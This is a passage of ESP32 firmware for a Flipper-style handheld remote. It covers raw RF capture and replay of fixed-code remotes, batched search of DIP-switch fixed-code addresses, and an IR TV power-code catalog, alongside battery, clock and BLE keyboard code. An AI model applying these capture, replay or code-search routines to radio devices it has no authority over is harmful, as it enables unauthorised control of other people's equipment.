uint8_t clock_edit_month = 1;
uint8_t clock_edit_day = 1;
uint8_t clock_edit_hour = 12;
uint8_t clock_edit_minute = 0;
uint8_t clock_edit_field = 0;


// ============================================================
// STATUS INDICATOR
// ============================================================

lv_obj_t *status_label = NULL;
lv_obj_t *status_dot = NULL;
#define MAX_STATUS_INDICATORS 48
lv_obj_t *status_labels[MAX_STATUS_INDICATORS];
lv_obj_t *status_dots[MAX_STATUS_INDICATORS];
uint8_t status_indicator_count = 0;
uint32_t transmitting_status_until_ms = 0;

// Connection badges are separate from the activity status. Bluetooth shows
// PAIR only while advertising and LINK only while actively connected.
#define MAX_CONNECTION_INDICATORS 48
lv_obj_t *wifi_link_labels[MAX_CONNECTION_INDICATORS];
lv_obj_t *ble_link_labels[MAX_CONNECTION_INDICATORS];
uint8_t connection_indicator_count = 0;
bool wifi_link_last_connected = false;
bool ble_link_last_connected = false;
bool ble_link_last_paired = false;


// ============================================================
// BATTERY MONITOR
// ============================================================

#define MAX_BATTERY_INDICATORS 48
lv_obj_t *battery_labels[MAX_BATTERY_INDICATORS];
uint8_t battery_indicator_count = 0;
bool battery_monitor_ready = false;
int battery_percent = -1;
uint16_t battery_voltage_mv = 0;
bool battery_charging = false;
uint32_t battery_last_read_ms = 0;

// Shut the handheld down after it has been untouched on battery power. USB
// operation is excluded so compiling, uploading, and serial diagnostics are
// never interrupted. Any touchscreen contact restarts the full timeout.
#define AUTO_SHUTDOWN_IDLE_MS (10UL * 60UL * 1000UL)
uint32_t auto_shutdown_last_activity_ms = 0;


void refresh_battery_indicator() {
  uint32_t color = COLOR_MUTED;
  const char *text = "BAT --";
  char battery_text[18];

  if (battery_monitor_ready && battery_percent >= 0) {
    snprintf(battery_text, sizeof(battery_text), "BAT %d%%%s", battery_percent,
             battery_charging ? "+" : "");
    text = battery_text;
    color = battery_percent <= 15 ? COLOR_RED :
            battery_percent <= 35 ? COLOR_SETTINGS : COLOR_GREEN;
  }

  for (uint8_t i = 0; i < battery_indicator_count; i++) {
    lv_label_set_text(battery_labels[i], text);
    lv_obj_set_style_text_color(battery_labels[i], lv_color_hex(color), LV_PART_MAIN);
  }
}


void read_battery_level() {
  if (!battery_monitor_ready) {
    refresh_battery_indicator();
    return;
  }

  if (battery_pmu.isBatteryConnect()) {
    int percentage = battery_pmu.getBatteryPercent();
    battery_percent = (percentage >= 0 && percentage <= 100) ? percentage : -1;
    battery_voltage_mv = battery_pmu.getBattVoltage();
    battery_charging = battery_pmu.isCharging();
  } else {
    battery_percent = -1;
    battery_voltage_mv = 0;
    battery_charging = false;
  }
  refresh_battery_indicator();
}


void initialize_battery_monitor() {
  battery_monitor_ready = battery_pmu.begin(Wire, AXP2101_SLAVE_ADDRESS, I2C_SDA, I2C_SCL);
  if (!battery_monitor_ready) {
    Serial.println("Battery monitor unavailable");
    return;
  }

  battery_pmu.enableBattDetection();
  battery_pmu.enableBattVoltageMeasure();
  read_battery_level();
  Serial.printf("Battery monitor ready: %dmV, %d%%\n", battery_voltage_mv, battery_percent);
}


// ============================================================
// UNIVERSAL REMOTE DATA
// ============================================================

#define MAX_UNIVERSAL_BUTTONS 12
// Retain enough of a repeating fixed-code burst to be useful, while keeping
// each saved NVS record comfortably small.  This is the same general idea as
// Flipper's raw/BinRAW modes: save a useful repeated waveform, not one
// arbitrary short slice from the receiver buffer.
#define RF_SAVED_RAW_MAX_EDGES 256
#define RF_SAVED_RAW_MAGIC 0x52465231UL

// A compact, exact-timing capture for one fixed-code OOK button.  It records
// the CC1101 preset too: a waveform is only meaningful with the receive/
// transmit profile that produced it.
struct SavedRfRawCommand {
  uint8_t valid;
  uint8_t profile_index;
  uint8_t first_level;
  uint16_t edge_count;
  uint16_t durations_us[RF_SAVED_RAW_MAX_EDGES];
};

struct RfLearnFrame {
  uint16_t edge_count;
  uint8_t first_level;
  uint16_t durations_us[RF_SAVED_RAW_MAX_EDGES];
};

int universal_button_count = 0;
bool universal_remote_loaded_from_save = false;

char universal_button_names[MAX_UNIVERSAL_BUTTONS][20];
SavedRfRawCommand universal_working_rf_commands[MAX_UNIVERSAL_BUTTONS] = {};
RfLearnFrame rf_learn_frames[RF_LEARN_SAMPLE_COUNT] = {};
bool rf_learn_sample_clean[RF_LEARN_SAMPLE_COUNT] = {};
const char *rf_smart_learn_category = "UNKNOWN";
bool rf_rolling_confirmation_pending = false;
RfLearnFrame rf_rolling_first_frames[RF_LEARN_SAMPLE_COUNT] = {};
uint32_t rf_rolling_first_fingerprints[RF_LEARN_SAMPLE_COUNT] = {};
uint16_t rf_rolling_first_edge_count = 0;
uint8_t rf_rolling_first_level = 0;


// ============================================================
// KNOWN DEVICE DATA
// ============================================================

#define MAX_KNOWN_STEPS 13

const char *current_device_name = "";

const char *current_steps[MAX_KNOWN_STEPS];

int current_step_count = 0;
int current_step_index = 0;
bool rf_guided_learning_active = false;

lv_obj_t *known_instruction_label = NULL;
lv_obj_t *known_progress_label = NULL;
lv_obj_t *known_learn_button = NULL;
lv_obj_t *known_skip_button = NULL;
lv_obj_t *known_review_button = NULL;
lv_obj_t *rf_capture_instruction_label = NULL;


// ============================================================
// RF DISCOVERY DATA
// ============================================================
// Discovery remains separate from learning/copying an existing remote.
// Candidate packets are a radio bring-up path, not a claim of protocol
// compatibility with every unknown RF device.

#define DISCOVERY_CANDIDATE_COUNT 8

const char *discovery_category = "UNKNOWN";
int discovery_candidate_index = 0;
bool discovery_has_anchor = false;

// DIP Fan Discovery is intentionally narrow: it tests one common PT2262
// style fixed-code waveform at a time, rather than broadcasting a large
// range of unknown RF commands.
uint8_t dip_fan_profile_index = 2;  // 433.92 MHz OOK
uint8_t dip_fan_address = 0;
bool dip_fan_uses_five_switches = false;
enum FixedCodeFamily : uint8_t {
  FIXED_CODE_FAMILY_TRISTATE = 0,
  FIXED_CODE_FAMILY_EV1527 = 1,
  FIXED_CODE_FAMILY_REGENCY = 2
};
FixedCodeFamily fixed_code_family = FIXED_CODE_FAMILY_TRISTATE;
uint8_t dip_fan_command_index = 0;
uint8_t fixed_code_category_index = 0;
const char *fixed_code_category_name = "UNKNOWN";
bool dip_fan_anchor_found = false;
bool dip_fan_candidate_sent = false;
uint8_t dip_fan_working_count = 0;
SavedRfRawCommand dip_fan_working_commands[3] = {};
char dip_fan_working_names[3][20] = {};
bool discovery_button_naming = false;

// Coarse-to-fine discovery sends four bounded candidates at a time. A
// reported reaction changes the workflow to one-at-a-time verification of
// only that batch, so the matching family/address can still be identified.
enum DipFanGroupMode : uint8_t {
  DIP_FAN_GROUP_OFF = 0,
  DIP_FAN_GROUP_BATCH,
  DIP_FAN_GROUP_NARROW
};
DipFanGroupMode dip_fan_group_mode = DIP_FAN_GROUP_OFF;
uint8_t dip_fan_group_start = 0;
uint8_t dip_fan_group_count = 0;
uint8_t dip_fan_group_offset = 0;
#define DIP_FAN_GROUP_SIZE 4
#define DIP_FAN_BASE_SEARCH_CANDIDATE_COUNT 96
#define DIP_FAN_REGENCY_CANDIDATE_COUNT 16

lv_obj_t *discovery_category_label = NULL;
lv_obj_t *discovery_candidate_label = NULL;
lv_obj_t *discovery_hint_label = NULL;


// ============================================================
// SAVED REMOTE FOUNDATION
// ============================================================
// This persists discovery metadata only.  Raw/decoded RF data is added only
// after the replacement CC1101 passes its hardware test.

#define MAX_SAVED_REMOTES 8
#define SAVED_REMOTE_MAGIC 0x525A5231UL

struct SavedRemoteRecord {
  uint32_t magic;
  char name[24];
  char category[20];
  uint8_t candidate_index;
  bool has_anchor;
  uint8_t button_count;
  char button_names[MAX_UNIVERSAL_BUTTONS][20];
};

// Button positions deliberately live outside the saved command records. That
// makes the editor backward-compatible with remotes already stored in NVS:
// no learned RF/IR command data needs to be migrated just to move a tile.
#define SAVED_REMOTE_LAYOUT_MAGIC 0x4C415931UL
struct SavedRemoteLayout {
  uint32_t magic;
  int16_t x[MAX_UNIVERSAL_BUTTONS];
  int16_t y[MAX_UNIVERSAL_BUTTONS];
};

Preferences saved_preferences;
Preferences wifi_preferences;
SavedRemoteRecord saved_remotes[MAX_SAVED_REMOTES];
SavedRfRawCommand saved_rf_raw_commands[MAX_SAVED_REMOTES][MAX_UNIVERSAL_BUTTONS] = {};
SavedRemoteLayout saved_rf_layouts[MAX_SAVED_REMOTES] = {};
uint8_t saved_remote_count = 0;
int8_t discovery_anchor_index = -1;
int8_t selected_saved_index = -1;


// ============================================================
// DISPLAY BRIGHTNESS / CLOCK
// ============================================================

bool initialize_board_speaker() {
  board_audio_codec = es8311_create(I2C_NUM_0, ES8311_ADDRRES_0);
  if (board_audio_codec == NULL) return false;
  const es8311_clock_config_t clock_config = {
    .mclk_inverted = false,
    .sclk_inverted = false,
    .mclk_from_mclk_pin = true,
    .mclk_frequency = AUDIO_SAMPLE_RATE * 256,
    .sample_frequency = AUDIO_SAMPLE_RATE
  };
  if (es8311_init(board_audio_codec, &clock_config,
                  ES8311_RESOLUTION_16, ES8311_RESOLUTION_16) != ESP_OK) return false;
  if (es8311_voice_volume_set(board_audio_codec, 55, NULL) != ESP_OK) return false;
  es8311_microphone_config(board_audio_codec, false);
  board_audio_i2s.setPins(AUDIO_BCLK_PIN, AUDIO_LRCLK_PIN, AUDIO_DOUT_PIN,
                          AUDIO_DIN_PIN, AUDIO_MCLK_PIN);
  board_audio_ready = board_audio_i2s.begin(I2S_MODE_STD, AUDIO_SAMPLE_RATE,
    I2S_DATA_BIT_WIDTH_16BIT, I2S_SLOT_MODE_STEREO, I2S_STD_SLOT_BOTH);
  return board_audio_ready;
}

void play_board_tone(uint16_t frequency_hz, uint16_t duration_ms) {
  if (!board_audio_ready || frequency_hz == 0 || duration_ms == 0) return;
  int16_t samples[256];
  const uint32_t total_frames = (uint32_t)AUDIO_SAMPLE_RATE * duration_ms / 1000U;
  const uint32_t half_period = max(1UL, (uint32_t)AUDIO_SAMPLE_RATE / (frequency_hz * 2UL));
  uint32_t frame = 0;
  while (frame < total_frames) {
    uint16_t frames = min(128UL, total_frames - frame);
    for (uint16_t i = 0; i < frames; i++) {
      int16_t sample = (((frame + i) / half_period) & 1U) ? 3500 : -3500;
      samples[i * 2] = sample;
      samples[i * 2 + 1] = sample;
    }
    board_audio_i2s.write((const uint8_t *)samples, frames * 4U);
    frame += frames;
  }
}

void load_display_clock_preferences() {
  saved_preferences.begin("ripperzero", true);
  display_brightness = saved_preferences.getUChar("brightness", 100);
  clock_24_hour = saved_preferences.getBool("clock24", false);
  saved_preferences.end();
  if (display_brightness < 10 || display_brightness > 100) display_brightness = 100;
}

void save_display_brightness() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putUChar("brightness", display_brightness);
  saved_preferences.end();
}

void save_clock_format() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putBool("clock24", clock_24_hour);
  saved_preferences.end();
}

void apply_display_brightness(uint8_t percent) {
  percent = constrain(percent, 0, 100);
  uint32_t duty = ((uint32_t)percent * 255U) / 100U;
  ledcWrite(GFX_BL, duty);
}

uint8_t days_in_clock_month(uint16_t year, uint8_t month) {
  static const uint8_t days[] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
  if (month == 2 && ((year % 400 == 0) || (year % 4 == 0 && year % 100 != 0))) return 29;
  return days[constrain((int)month, 1, 12) - 1];
}

void format_clock_text(char *buffer, size_t size, const RTC_DateTime &date_time,
                       bool include_date) {
  uint8_t hour = date_time.getHour();
  if (clock_24_hour) {
    if (include_date) {
      snprintf(buffer, size, "%02u/%02u/%04u   %02u:%02u",
               date_time.getMonth(), date_time.getDay(), date_time.getYear(),
               hour, date_time.getMinute());
    } else {
      snprintf(buffer, size, "%02u:%02u", hour, date_time.getMinute());
    }
  } else {
    const char *suffix = hour >= 12 ? "PM" : "AM";
    uint8_t display_hour = hour % 12;
    if (display_hour == 0) display_hour = 12;
    if (include_date) {
      snprintf(buffer, size, "%02u/%02u/%04u   %u:%02u %s",
               date_time.getMonth(), date_time.getDay(), date_time.getYear(),
               display_hour, date_time.getMinute(), suffix);
    } else {
      snprintf(buffer, size, "%u:%02u %s", display_hour, date_time.getMinute(), suffix);
    }
  }
}

void refresh_home_clock() {
  if (home_clock_label == NULL) return;
  if (!rtc_ready || !rtc.isClockIntegrityGuaranteed()) {
    lv_label_set_text(home_clock_label, "CLOCK NOT SET");
    return;
  }
  RTC_DateTime now = rtc.getDateTime();
  char clock_text[24];
  format_clock_text(clock_text, sizeof(clock_text), now, false);
  lv_label_set_text(home_clock_label, clock_text);
}

void refresh_header_clocks() {
  char clock_text[32] = "CLOCK\nNOT SET";
  if (rtc_ready && rtc.isClockIntegrityGuaranteed()) {
    RTC_DateTime now = rtc.getDateTime();
    uint8_t hour = now.getHour();
    if (clock_24_hour) {
      snprintf(clock_text, sizeof(clock_text), "%02u:%02u\n%02u/%02u/%02u",
               hour, now.getMinute(),
               now.getMonth(), now.getDay(), now.getYear() % 100);
    } else {
      const char *suffix = hour >= 12 ? "PM" : "AM";
      uint8_t display_hour = hour % 12;
      if (display_hour == 0) display_hour = 12;
      snprintf(clock_text, sizeof(clock_text), "%u:%02u %s\n%02u/%02u/%02u",
               display_hour, now.getMinute(), suffix,
               now.getMonth(), now.getDay(), now.getYear() % 100);
    }
  }
  uint8_t write_index = 0;
  for (uint8_t i = 0; i < header_clock_count; i++) {
    if (header_clock_labels[i] == NULL || !lv_obj_is_valid(header_clock_labels[i])) continue;
    header_clock_labels[write_index++] = header_clock_labels[i];
    lv_label_set_text(header_clock_labels[i], clock_text);
  }
  header_clock_count = write_index;
}


// ============================================================
// IR TV POWER BLAST FOUNDATION
// ============================================================
// This is a bounded catalog, not a repeating broadcast loop.  It is used
// only when the IR transmitter has initialized successfully.

#define IR_TV_CANDIDATE_COUNT 12

const char *ir_tv_candidates[IR_TV_CANDIDATE_COUNT] = {
  "NEC TV POWER A",
  "NEC TV POWER B",
  "NEC TV POWER C",
  "NEC TV POWER D",
  "NEC TV POWER E",
  "NEC TV POWER F",
  "SAMSUNG POWER",
  "SONY POWER",
  "LG POWER",
  "JVC POWER",
  "TOSHIBA POWER A",
  "TOSHIBA POWER B"
};

int ir_tv_candidate_index = 0;
bool ir_transmitter_ready = false;
bool ir_rmt_transmitter_ready = false;
bool ir_receiver_ready = false;
bool ir_receiver_test_active = false;
bool ir_power_learn_active = false;
uint32_t ir_receiver_test_started_ms = 0;
int8_t ir_receiver_test_result = -1;

struct LearnedIrCommand {
  uint8_t valid;
  uint16_t protocol;
  uint16_t address;
  uint16_t command;
  uint16_t bits;
  uint64_t raw_data;
};

LearnedIrCommand learned_ir_power = {};


// ============================================================
// SAVED IR REMOTES
// ============================================================
// Kept separate from RF saved remotes: an IR command is decoded data that
// IRremote can re-send, while an RF saved remote currently holds RF metadata.

#define MAX_IR_SAVED_REMOTES 3
#define MAX_IR_REMOTE_BUTTONS 12
#define SAVED_IR_REMOTE_MAGIC 0x49525231UL

struct SavedIrRemoteCommand {
  uint8_t valid;
  uint16_t protocol;
  uint16_t address;
  uint16_t command;
  uint16_t extra;
  uint16_t bits;
  uint8_t flags;
  uint64_t raw_data;
};

struct SavedIrRemoteRecord {
  uint32_t magic;
  char name[24];
  uint8_t button_count;
  char button_names[MAX_IR_REMOTE_BUTTONS][20];
  SavedIrRemoteCommand buttons[MAX_IR_REMOTE_BUTTONS];
};

// Format used by the first IR-remote release. Keep it solely to migrate the
// user's already-saved 8-button remotes after expanding guided TV copy.
struct SavedIrRemoteRecordV1 {
  uint32_t magic;
  char name[24];
  uint8_t button_count;
  char button_names[8][20];
  SavedIrRemoteCommand buttons[8];
};

const char *ir_button_label_choices[] = {
  "POWER", "VOLUME UP", "VOLUME DOWN", "MUTE",
  "UP", "DOWN", "LEFT", "RIGHT", "SELECT", "BACK",
  "PLAY / PAUSE", "CUSTOM BUTTON"
};
const uint8_t IR_BUTTON_LABEL_CHOICE_COUNT =
  sizeof(ir_button_label_choices) / sizeof(ir_button_label_choices[0]);

SavedIrRemoteRecord saved_ir_remotes[MAX_IR_SAVED_REMOTES];
SavedRemoteLayout saved_ir_layouts[MAX_IR_SAVED_REMOTES] = {};
uint8_t saved_ir_remote_count = 0;
int8_t selected_ir_saved_index = -1;
SavedIrRemoteRecord ir_working_remote = {};
bool ir_working_remote_from_save = false;
uint8_t ir_next_button_label_index = 0;
bool ir_remote_learn_active = false;
int8_t ir_pending_send_index = -1;
// Keep the index and the request flag separate.  The request flag is set only
// by a real LVGL button click; therefore a stale/corrupted index can never
// trigger an IR transmission immediately after boot.
bool ir_pending_send_requested = false;
int8_t ir_volume_hold_index = -1;
bool ir_volume_hold_active = false;
bool ir_volume_hold_consumed_click = false;
uint32_t ir_volume_hold_last_send_ms = 0;

// Flags reserved for discovery anchors that need an exact legacy/raw send
// routine rather than IRremote's decoded-address send path.
#define IR_DISCOVERY_FLAG_SAMSUNG_MSB 0x80
#define IR_DISCOVERY_FLAG_SONY 0x40
const char *ir_discovery_device_name = "TV";
uint8_t ir_discovery_candidate_index = 0;
bool ir_discovery_candidate_sent = false;
bool ir_name_saves_discovery_anchor = false;

const char *ir_guided_device_name = "";
const char *ir_guided_steps[MAX_IR_REMOTE_BUTTONS];
uint8_t ir_guided_step_count = 0;
uint8_t ir_guided_step_index = 0;
bool ir_guided_copy_active = false;
bool ir_name_saves_guided_copy = false;
int8_t ir_pending_custom_button_index = -1;

// Layout editor state. The editor moves one selected tile at a time with
// large touch controls, which is more reliable on this small display than
// free-form drag gestures while the RF/IR transmitter remains idle.
bool remote_layout_editing_ir = true;
uint8_t remote_layout_editing_remote_index = 0;
int8_t remote_layout_selected_button = -1;
SavedRemoteLayout remote_layout_before_edit = {};

// Explicit declarations keep the Arduino sketch preprocessor from having to
// infer the callback order for the dynamically rebuilt IR screens.
void open_ir_saved(lv_event_t *e);
void refresh_ir_remote_builder();
void start_ir_button_learn(lv_event_t *e);
void skip_guided_ir_step(lv_event_t *e);
void next_ir_button_label(lv_event_t *e);
void save_ir_working_remote(lv_event_t *e);
void select_next_ir_saved_remote(lv_event_t *e);
void open_selected_ir_remote(lv_event_t *e);
void delete_selected_ir_remote(lv_event_t *e);
void start_new_ir_remote(lv_event_t *e);
void commit_ir_remote_name(lv_event_t *e);
void cancel_ir_button_learn(lv_event_t *e);
void create_ir_saved_screen();
void create_ir_remote_name_screen();
void create_ir_learn_screen();
void ensure_ir_remote_builder_screen();
void create_ir_copy_category_screen();
void create_ir_guided_copy_screen();
void create_ir_discovery_screen();
void create_ir_discovery_category_screen();
void refresh_ir_discovery_screen();
const char *ir_discovery_candidate_name();
uint8_t ir_discovery_candidate_count();
void fill_ir_discovery_anchor(SavedIrRemoteCommand &command);
bool transmit_ir_discovery_candidate();
void start_ir_discovery(const char *device_name);
void start_ir_discovery_tv(lv_event_t *e);
void start_ir_discovery_projector(lv_event_t *e);
void start_ir_discovery_light(lv_event_t *e);
void start_ir_discovery_fan(lv_event_t *e);
void start_ir_discovery_other(lv_event_t *e);
void send_ir_discovery_candidate(lv_event_t *e);
void ir_discovery_worked(lv_event_t *e);
void ir_discovery_next(lv_event_t *e);
void create_ir_blast_screen();
void create_ir_blast_transmit_screen();
void create_saved_hub_screen();
void refresh_saved_hub();
void create_saved_delete_confirm_screen();
void request_saved_hub_delete(lv_event_t *e);
void confirm_saved_hub_delete(lv_event_t *e);
void cancel_saved_hub_delete(lv_event_t *e);
void begin_saved_remote_rename(lv_event_t *e);
void commit_saved_remote_rename(lv_event_t *e);
void create_saved_rename_screen();
void create_ir_custom_button_name_screen();
void create_rf_button_name_screen();
void commit_rf_button_name(lv_event_t *e);
void create_rf_scope_screen();
void create_rf_scanner_screen();
void open_rf_scanner(lv_event_t *e);
void update_live_rf_scanner();
void stop_live_rf_scanner();
void cycle_live_rf_band(lv_event_t *e);
void toggle_live_rf_hold(lv_event_t *e);
void analyze_live_rf_peak(lv_event_t *e);
void select_live_rf_frequency(lv_event_t *e);
void show_rf_scanner_details(lv_event_t *e);
void close_rf_scanner(lv_event_t *e);
void return_to_rf_scanner(lv_event_t *e);
void update_rf_scanner_stage(const char *stage, const char *message,
                             uint8_t progress, bool show_result_actions);
void create_rf_profile_screen();
void open_rf_profile(lv_event_t *e);
void refresh_rf_profile_screen();
void select_rf_profile(lv_event_t *e);
void refresh_universal_remote();
void start_new_universal_remote(lv_event_t *e);
void close_rf_profile(lv_event_t *e);
void refresh_rf_scope_labels();
void refresh_rf_scope_tab();
void refresh_rf_scope_details();
void set_rf_scope_state(const char *state, uint32_t color);
void clear_rf_scope_waterfall();
void push_rf_scope_waterfall();
void select_rf_scope_tab(lv_event_t *e);
void open_rf_scope(lv_event_t *e);
void close_rf_scope(lv_event_t *e);
void update_rf_scope();
void open_rf_scope_pulse_capture(lv_event_t *e);
void start_rf_scan_and_analyze(lv_event_t *e);
void lock_rf_scope_strongest(lv_event_t *e);
void save_rf_analysis_report(lv_event_t *e);
void update_rf_scope_sweep();
void run_rf_scope_315_sweep(lv_event_t *e);
void run_rf_scope_390_sweep(lv_event_t *e);
void run_rf_scope_433_sweep(lv_event_t *e);
void finish_rf_scope_pulse_capture();
void create_qr_generator_screen();
void create_qr_display_screen();
void open_qr_generator(lv_event_t *e);
void generate_qr_code(lv_event_t *e);
void qr_new_code(lv_event_t *e);
void create_brightness_screen();
void create_clock_settings_screen();
void create_wifi_credentials_screen();
void open_brightness_settings(lv_event_t *e);
void open_clock_settings(lv_event_t *e);
void decrease_brightness(lv_event_t *e);
void increase_brightness(lv_event_t *e);
void clock_previous_field(lv_event_t *e);
void clock_next_field(lv_event_t *e);
void clock_decrease_value(lv_event_t *e);
void clock_increase_value(lv_event_t *e);
void clock_toggle_format(lv_event_t *e);
void clock_save(lv_event_t *e);
void refresh_brightness_screen();
void refresh_clock_edit_screen();
void turn_off_device(lv_event_t *e);
uint8_t dip_fan_switch_count();
uint8_t dip_fan_address_limit();
void open_dip_fan_config(lv_event_t *e);
void refresh_dip_fan_config();
void dip_fan_use_four_switches(lv_event_t *e);
void dip_fan_use_five_switches(lv_event_t *e);
void dip_fan_use_tristate(lv_event_t *e);
void dip_fan_use_ev1527(lv_event_t *e);
void dip_fan_use_regency(lv_event_t *e);
void dip_fan_toggle_switch(lv_event_t *e);
void dip_fan_send_group(lv_event_t *e);
void dip_fan_select_304(lv_event_t *e);
void close_dip_fan_config(lv_event_t *e);
void create_dip_fan_config_screen();
void copy_dip_fan_original(lv_event_t *e);
void create_bluetooth_bonds_screen();
void create_bluetooth_forget_confirm_screen();
void open_bluetooth_bonds(lv_event_t *e);
void refresh_bluetooth_bonds_screen();
void bluetooth_previous_bond(lv_event_t *e);
void bluetooth_next_bond(lv_event_t *e);
void request_bluetooth_forget(lv_event_t *e);
void confirm_bluetooth_forget(lv_event_t *e);
void cancel_bluetooth_forget(lv_event_t *e);
void select_bluetooth_bond_row(lv_event_t *e);


// ============================================================
// BLUETOOTH HID REMOTE
// ============================================================
// Apple TV can pair with Bluetooth keyboards.  This is a standard BLE HID
// keyboard service; it does not try to imitate or pair as a Siri Remote.

bool bluetooth_ready = false;
bool ble_stack_initialized = false;
volatile bool bluetooth_connected = false;
bool bluetooth_last_connected = false;
char bluetooth_start_message[192] = "";
NimBLEServer *bluetooth_server = NULL;
NimBLEHIDDevice *bluetooth_hid = NULL;
NimBLECharacteristic *bluetooth_input_report = NULL;
NimBLECharacteristic *phone_control_characteristic = NULL;
volatile uint8_t phone_control_pending_command = 0;

// Local, bonded BLE control channel. A phone BLE utility can write one of:
// PING, STATUS, HOME, RF, or IR. Navigation is queued for loop() because BLE
// callbacks run outside LVGL's task context. No RF/IR transmission command is
// exposed here.
#define PHONE_CONTROL_SERVICE_UUID        "7d4f0001-6b7a-4d4d-9a31-525a45524f30"
#define PHONE_CONTROL_CHARACTERISTIC_UUID "7d4f0002-6b7a-4d4d-9a31-525a45524f30"

const uint8_t bluetooth_keyboard_report_map[] = {
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,  // Generic Desktop / Keyboard
  0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01,
  0x75, 0x01, 0x95, 0x08, 0x81, 0x02,  // Modifier keys
  0x95, 0x01, 0x75, 0x08, 0x81, 0x01,  // Reserved byte
  0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05,
  0x91, 0x02, 0x95, 0x01, 0x75, 0x03, 0x91, 0x01,  // LED output
  0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07,
  0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xC0  // Six keyboard keys
};

class BluetoothServerCallbacks : public NimBLEServerCallbacks {
  void onConnect(NimBLEServer *server, NimBLEConnInfo &connection) override {
    bluetooth_connected = true;
    Serial.println("Bluetooth keyboard connected");
  }

  void onDisconnect(NimBLEServer *server, NimBLEConnInfo &connection, int reason) override {
    bluetooth_connected = false;
    Serial.println("Bluetooth keyboard disconnected; advertising continues");
  }
};


class PhoneControlCallbacks : public NimBLECharacteristicCallbacks {
  void onWrite(NimBLECharacteristic *characteristic,
               NimBLEConnInfo &connection) override {
    std::string command = characteristic->getValue();
    for (char &c : command) c = (char)toupper((unsigned char)c);
    while (!command.empty() &&
           (command.back() == '\n' || command.back() == '\r' || command.back() == ' ')) {
      command.pop_back();
    }

    if (command == "PING" || command == "STATUS") {
      const char *reply = command == "PING" ? "PONG" :
        (cc1101_ready ? "READY;CC1101=1" : "READY;CC1101=0");
      characteristic->setValue(reply);
      characteristic->notify(connection.getConnHandle());
    } else if (command == "HOME") {
      phone_control_pending_command = 1;
    } else if (command == "RF") {
      phone_control_pending_command = 2;
    } else if (command == "IR") {
      phone_control_pending_command = 3;
    } else {
      characteristic->setValue("ERR;COMMANDS=PING,STATUS,HOME,RF,IR");
      characteristic->notify(connection.getConnHandle());
    }
  }
};


bool ensure_ble_stack() {
  if (ble_stack_initialized) return true;

  const size_t ble_internal_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
  const size_t ble_largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL);
  Serial.printf("BLE preflight: internal=%u largest=%u\n",
                (unsigned)ble_internal_free, (unsigned)ble_largest_block);

  // NimBLE's controller and radio PHY allocate sizable contiguous blocks from
  // internal RAM. On this full UI build, ESP-IDF aborts instead of returning
  // an allocation error when that headroom is not available.
  if (ble_internal_free < 180000 || ble_largest_block < 100000) {
    Serial.println("BLE start held: not enough safe internal RAM");
    snprintf(bluetooth_start_message, sizeof(bluetooth_start_message),
             "BLUETOOTH HELD SAFELY\n\nNot enough free internal RAM.\nFree: %u KB   Largest: %u KB\n\nRestart Ripper, then tap PAIR\nbefore opening Wi-Fi or BLE scans.",
             (unsigned)(ble_internal_free / 1024),
             (unsigned)(ble_largest_block / 1024));
    return false;
  }

  if (!NimBLEDevice::init("RipperZero Remote")) {
    Serial.println("Bluetooth initialization failed");
    snprintf(bluetooth_start_message, sizeof(bluetooth_start_message),
             "BLUETOOTH START FAILED\n\nRestart Ripper and try PAIR\nagain before opening scanners.");
    return false;
  }

  bluetooth_start_message[0] = '\0';
  ble_stack_initialized = true;
  return true;
}


void refresh_bluetooth_screen() {
  if (bluetooth_state_label == NULL) return;

  const bool has_paired_device = ble_stack_initialized && NimBLEDevice::getNumBonds() > 0;
  for (uint8_t i = 0; i < BLUETOOTH_REMOTE_CONTROL_COUNT; i++) {
    if (bluetooth_remote_controls[i] == NULL) continue;
    if (has_paired_device) {
      lv_obj_clear_flag(bluetooth_remote_controls[i], LV_OBJ_FLAG_HIDDEN);
    } else {
      lv_obj_add_flag(bluetooth_remote_controls[i], LV_OBJ_FLAG_HIDDEN);
    }
  }

  if (bluetooth_connected) {
    lv_label_set_text(bluetooth_state_label, "CONNECTED\n\nUse the controls below.");
  } else if (bluetooth_ready) {
    lv_label_set_text(bluetooth_state_label,
                      "READY TO PAIR\n\nApple TV: Settings > Remotes\nand Devices > Bluetooth");
  } else if (bluetooth_start_message[0] != '\0') {
    lv_label_set_text(bluetooth_state_label, bluetooth_start_message);
  } else {
    lv_label_set_text(bluetooth_state_label,
                      "NOT ADVERTISING\n\nTap PAIR / RECONNECT first.");
  }
}


void refresh_connection_indicators() {
  const bool wifi_connected = WiFi.status() == WL_CONNECTED;
  const bool ble_advertising = bluetooth_ready &&
                               NimBLEDevice::getAdvertising() != NULL &&
                               NimBLEDevice::getAdvertising()->isAdvertising();

  for (uint8_t i = 0; i < connection_indicator_count; i++) {
    if (wifi_link_labels[i] != NULL) {
      if (wifi_connected) {
        lv_label_set_text(wifi_link_labels[i], "WIFI");
        lv_obj_set_style_text_color(wifi_link_labels[i], lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
        lv_obj_clear_flag(wifi_link_labels[i], LV_OBJ_FLAG_HIDDEN);
      } else {
        lv_obj_add_flag(wifi_link_labels[i], LV_OBJ_FLAG_HIDDEN);
      }
    }

    if (ble_link_labels[i] != NULL) {
      if (bluetooth_connected) {
        lv_label_set_text(ble_link_labels[i], "BT LINK");
        lv_obj_set_style_text_color(ble_link_labels[i], lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
        lv_obj_clear_flag(ble_link_labels[i], LV_OBJ_FLAG_HIDDEN);
      } else if (ble_advertising) {
        lv_label_set_text(ble_link_labels[i], "BT PAIR");
        lv_obj_set_style_text_color(ble_link_labels[i], lv_color_hex(COLOR_BLUETOOTH), LV_PART_MAIN);
        lv_obj_clear_flag(ble_link_labels[i], LV_OBJ_FLAG_HIDDEN);
      } else {
        lv_obj_add_flag(ble_link_labels[i], LV_OBJ_FLAG_HIDDEN);
      }
    }
  }
}


bool start_bluetooth_keyboard() {
  if (!bluetooth_ready) {
